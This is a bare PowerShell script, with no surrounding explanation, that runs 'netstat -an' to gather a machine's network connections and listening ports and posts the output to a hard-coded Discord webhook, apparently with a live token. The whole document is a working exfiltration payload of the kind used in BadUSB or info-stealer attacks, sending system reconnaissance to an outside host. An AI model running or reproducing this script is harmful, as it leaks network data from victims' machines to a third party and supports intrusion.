$discordWebhook = "https://discord.com/api/webhooks/1074416258163941508/krWdh9abXCCEkSDpGbNnMwjDYewxfV24DQM_N2shSJYnwo6CqD6x75qEhwtvhiMZlaJu"; 
$netstatOutput = netstat -an | Out-String; 
$body = @{
    content = "Netstat Data:"; 
    embeds = @(
        @{
            title = "Netstat Output"; 
            description = $netstatOutput.Trim(); 
            color = 16711680
        }
    )
}; 
$bodyJson = $body | ConvertTo-Json -Depth 10; 
Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType 'application/json' -Body $bodyJson
